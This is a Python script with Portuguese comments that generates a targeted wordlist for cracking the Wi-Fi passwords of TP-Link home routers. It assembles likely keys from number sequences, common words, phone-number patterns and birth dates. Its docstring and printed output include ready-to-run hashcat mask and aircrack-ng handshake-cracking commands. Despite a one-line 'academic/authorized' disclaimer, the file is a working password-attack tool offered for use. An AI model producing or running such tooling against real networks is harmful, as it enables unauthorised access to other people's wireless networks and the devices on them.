#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gerar_wordlist_tplink.py - Gera uma wordlist direcionada a roteadores TP-Link.

Roteadores TP-Link domesticos (linha Archer, AC750/Archer C20) costumam sair de
fabrica com senhas Wi-Fi fracas e previsiveis - tipicamente 8 digitos numericos,
ou padroes simples. Este gerador monta candidatos de ALTA probabilidade para
acelerar um ataque de dicionario, em vez de varrer todo o espaco.

Uso academico / autorizado.

Exemplos:
    python gerar_wordlist_tplink.py -o tplink.txt
    python gerar_wordlist_tplink.py -o tplink.txt --anos 1990 2025 --datas

Para o espaco COMPLETO de 8 digitos (100 milhoes) use mascara no hashcat, nao
wordlist:
    hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
"""

import argparse
import datetime


def candidatos(anos, incluir_datas):
    vistos = set()

    def add(p):
        p = str(p)
        if 8 <= len(p) <= 63 and p not in vistos:   # faixa valida de WPA-PSK
            vistos.add(p)
            return [p]
        return []

    out = []

    # 1) Senhas numericas classicas / sequencias
    bases = [
        "12345678", "87654321", "123456789", "1234567890",
        "11111111", "00000000", "88888888", "12121212",
        "12344321", "98765432", "147258369", "123123123",
    ]
    for b in bases:
        out += add(b)

    # 2) Palavras comuns + TP-Link
    palavras = ["password", "admin123", "senha123", "tplink", "tplink123",
                "wireless", "internet", "roteador", "familia", "wifi1234"]
    for w in palavras:
        out += add(w)
        out += add(w.capitalize())
        for suf in ("", "123", "1234", "12345", "2024", "2025", "@123"):
            out += add(w + suf)

    # 3) Telefones brasileiros fakes comuns (padrao DDD + numero, 8-11 digitos)
    for ddd in ("11", "21", "31", "41", "51", "61", "71", "81", "85"):
        for n in ("999999999", "988888888", "900000000"):
            out += add(ddd + n)

    # 4) Datas (DDMMYYYY e DDMMYY) - util porque muita gente usa aniversario
    if incluir_datas:
        ini, fim = anos
        for ano in range(ini, fim + 1):
            for mes in range(1, 13):
                dias = 31 if mes in (1, 3, 5, 7, 8, 10, 12) else \
                       (29 if mes == 2 else 30)
                for dia in (1, 10, 15, 20, 25, dias):   # amostra de dias
                    out += add(f"{dia:02d}{mes:02d}{ano:04d}")

    # 5) Anos repetidos / combinacoes simples de ano
    ini, fim = anos
    for ano in range(ini, fim + 1):
        out += add(str(ano) * 2)                # 20242024
        out += add(f"{ano}{ano % 100:02d}{ano % 100:02d}")

    return out


def main():
    ap = argparse.ArgumentParser(description="Gera wordlist direcionada a TP-Link.")
    ap.add_argument("-o", "--saida", default="tplink.txt", help="arquivo de saida")
    ap.add_argument("--anos", nargs=2, type=int, metavar=("INI", "FIM"),
                    default=[1980, datetime.date.today().year],
                    help="faixa de anos para datas (padrao: 1980..atual)")
    ap.add_argument("--datas", action="store_true",
                    help="inclui candidatos baseados em datas (DDMMYYYY)")
    args = ap.parse_args()

    lista = candidatos((args.anos[0], args.anos[1]), args.datas)
    with open(args.saida, "w", encoding="utf-8") as f:
        f.write("\n".join(lista) + "\n")

    print(f"[+] {len(lista)} candidatos gravados em {args.saida}")
    print("[*] Dica: para o espaco completo de 8 digitos, use mascara no hashcat:")
    print("    hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d")
    print("[*] Com aircrack-ng (handshake), use a wordlist:")
    print(f"    aircrack-ng -w {args.saida} -b <BSSID> captura-01.cap")


if __name__ == "__main__":
    main()
